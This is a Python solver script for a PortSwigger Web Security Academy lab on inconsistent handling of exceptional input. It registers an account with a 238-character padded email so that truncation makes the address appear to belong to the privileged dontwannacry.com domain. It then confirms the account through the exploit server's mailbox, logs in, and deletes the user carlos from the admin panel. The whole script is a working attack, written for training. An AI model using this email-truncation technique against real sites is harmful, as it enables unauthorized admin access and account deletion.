##################################################################################
#
# Lab: Inconsistent handling of exceptional input
#
# Hack Steps: 
#      1. Fetch the register page
#      2. Extract the csrf token and session cookie to register a new account
#      3. Register a new account Register a new account with a suitable offset
#         and dontwannacry.com before the real domain
#      4. Fetch the email client
#      5. Extract the link of account registration
#      6. Complete the account registration by following the link
#      7. Fetch the login page
#      8. Extract the csrf token and session cookie to login
#      9. Login to the new account
#      10. Delete carlos from the admin panel
#
##################################################################################
import requests
import re
from colorama import Fore

LAB_URL = "https://0af70075049f2d80832b069300ab0017.web-security-academy.net" # Change this to your lab URL
EXPLOIT_DOMAIN = "exploit-0ad0009104462d3483800592012500a3.exploit-server.net" # Change this to your exploit DOMAIN
NEW_USERNAME = "attacker"; # You can change this to what you want
NEW_PASSWORD = "hacking"; # You can change this to what you want

def main():
    print(Fore.WHITE + "⦗1⦘ Fetching the register page.. ", end="", flush=True)
    
    register_page = fetch(f"{LAB_URL}/register") 

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie to register a new account.. ", end="", flush=True)

    session = register_page.cookies.get("session")
    csrf = re.findall("csrf.+value=\"(.+)\"", register_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Registering a new account with a suitable offset and dontwannacry.com before the real domain.. ", end="", flush=True)

    offset = "a" * 238
    malicious_email = f"{offset}@dontwannacry.com.{EXPLOIT_DOMAIN}"
    cookies = { "session": session }
    data = { "username": NEW_USERNAME, "password": NEW_PASSWORD, "csrf": csrf, "email": malicious_email }
    post_data(f"{LAB_URL}/register", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Fetching the email client.. ", end="", flush=True)

    email_client = fetch(f"https://{EXPLOIT_DOMAIN}/email")
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Extracting the link of account registration.. ", end="", flush=True)

    regisration_link = re.findall(">(https.*)</a>", email_client.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Completing the account registration by following the link.. ", end="", flush=True)
    
    fetch(regisration_link)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗7⦘ Fetching the login page.. ", end="", flush=True)

    login_page = fetch(f"{LAB_URL}/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗8⦘ Extracting the csrf token and session cookie to login.. ", end="", flush=True)

    session = login_page.cookies.get("session")
    cookies = { "session": session }
    csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
    data = { "username": NEW_USERNAME, "password": NEW_PASSWORD, "csrf": csrf }

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗9⦘ Logging in to the new account.. ", end="", flush=True)
    
    login = post_data(f"{LAB_URL}/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗10⦘ Deleting carlos from the admin panel.. ", end="", flush=True)

    session = login.cookies.get("session")
    cookies = { "session": session }

    fetch(f"{LAB_URL}/admin/delete?username=carlos", cookies=cookies)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(url, cookies = None):
    try:  
        return requests.get(url, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + url + " through exception")
        exit(1)


def post_data(url, data, cookies = None):
    try:    
        return requests.post(url, data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + url + " through exception")
        exit(1)


if __name__ == "__main__":
    main()